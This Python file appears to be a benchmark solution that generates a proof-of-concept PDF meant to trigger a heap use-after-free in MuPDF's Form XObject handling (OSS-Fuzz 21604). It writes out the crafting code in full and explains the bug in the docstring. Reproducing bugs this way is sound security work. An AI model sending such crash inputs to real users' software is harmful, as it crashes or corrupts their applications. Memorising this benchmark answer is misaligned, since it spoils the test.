import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability.
        The vulnerability (arvo:21604 / OSS-Fuzz 21604) exists in MuPDF's handling of Form XObjects.
        Specifically, when a Form XObject is instantiated, the underlying Dictionary reference count 
        is not properly incremented, leading to a double free (and thus UAF) when the document is closed
        and both the XObject and the XRef table release the dictionary.
        """
        
        # We construct a minimal valid PDF with a Form XObject.
        # Loading and rendering this PDF will populate the resource store with the Form XObject.
        # Upon tearing down the document (or cache eviction), the refcount underflow triggers the crash.

        # PDF Header
        header = b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'

        # Object 1: Catalog
        obj1_content = b'<< /Type /Catalog /Pages 2 0 R >>'
        obj1 = b'1 0 obj\n' + obj1_content + b'\nendobj\n'

        # Object 2: Page Tree
        obj2_content = b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>'
        obj2 = b'2 0 obj\n' + obj2_content + b'\nendobj\n'

        # Object 3: Page
        # Defines resources including the Form XObject (Fm1) linked to Object 5
        obj3_content = b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << /XObject << /Fm1 5 0 R >> >> >>'
        obj3 = b'3 0 obj\n' + obj3_content + b'\nendobj\n'

        # Object 4: Content Stream
        # Invokes the Form XObject via the Do operator, forcing it to load.
        stream_data = b'q /Fm1 Do Q'
        obj4_content = b'<< /Length ' + str(len(stream_data)).encode() + b' >>\nstream\n' + stream_data + b'\nendstream'
        obj4 = b'4 0 obj\n' + obj4_content + b'\nendobj\n'

        # Object 5: Form XObject
        # This is the object that triggers the vulnerability in pdf_new_xobject
        form_data = b'0 0 100 100 re f'
        obj5_content = b'<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Length ' + str(len(form_data)).encode() + b' >>\nstream\n' + form_data + b'\nendstream'
        obj5 = b'5 0 obj\n' + obj5_content + b'\nendobj\n'

        # Assemble the PDF body
        body_objs = [obj1, obj2, obj3, obj4, obj5]
        
        # Calculate offsets for Cross-Reference Table
        offsets = []
        current_offset = len(header)
        for obj in body_objs:
            offsets.append(current_offset)
            current_offset += len(obj)
            
        pdf_body = header + b"".join(body_objs)
        
        # Generate Cross-Reference Table
        xref_offset = len(pdf_body)
        xref = b'xref\n0 6\n0000000000 65535 f \n'
        for offset in offsets:
            xref += f"{offset:010d} 00000 n \n".encode()
            
        # Trailer
        trailer = b'trailer\n<< /Size 6 /Root 1 0 R >>\n'
        
        # Startxref
        startxref = b'startxref\n' + str(xref_offset).encode() + b'\n%%EOF'
        
        return pdf_body + xref + trailer + startxref